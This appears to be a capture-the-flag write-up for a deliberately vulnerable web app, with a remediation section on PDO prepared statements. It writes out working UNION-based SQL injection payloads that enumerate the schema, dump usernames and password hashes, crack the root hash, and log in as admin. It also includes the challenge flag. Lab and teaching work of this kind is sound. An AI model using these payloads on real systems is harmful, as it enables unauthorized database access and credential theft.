# SQL Admin Connection

`B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`

---

## Description

go to `/?page=member`

submit : 
- `1 AND 1=2 UNION SELECT column_name , 1 FROM information_schema.columns`
- `1 AND 1=2 UNION SELECT table_name , 1 FROM information_schema.columns `
- `1 AND 1=2 UNION SELECT table_schema, 1 FROM information_schema.tables`

then : \
`1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`

password = 3bf1114a986ba87ed28fc1b5884fc2f8  =>  "shadow"

then go to `/index.php?page=signin`

login :	`root`\
mdp :	`shadow`

---

## How to prevent it ?

In the case of a php back-end, use PDO :
- The query will be sanitized with the `prepare` statement
- It will then be executed with the `execute` statement once the risk of an undesired effect is avoided

Here is a more detailed explanation found on StackOverflow regarding the `prepare` and `execute` commands :

>The SQL statement you pass to prepare is parsed and compiled by the database server. By specifying parameters (either a ? or a named parameter like :name in the example above) you tell the database engine where you want to filter on. Then when you call execute, the prepared statement is combined with the parameter values you specify.

>The important thing here is that the parameter values are combined with the compiled statement, not an SQL string. SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters, you limit the risk of ending up with something you didn't intend."